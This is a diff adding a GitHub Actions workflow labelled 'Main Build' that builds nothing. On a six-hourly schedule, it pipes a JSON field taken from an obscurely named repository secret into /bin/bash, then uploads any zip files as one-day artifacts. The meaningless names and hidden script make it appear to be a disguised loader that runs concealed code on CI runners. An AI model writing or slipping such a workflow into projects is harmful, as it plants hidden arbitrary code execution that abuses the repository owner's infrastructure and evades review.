@@ -1,0 +1,34 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '8 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          rqbhn7: ${{ secrets.rqbhn7 }}
+        run: |
+          printf '%s' "$rqbhn7" | jq -r .s91 | /bin/bash
+          echo $h4261 | jq -r .fptq93127 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ueupMDf2
+          path: "*.zip"
+          retention-days: 1
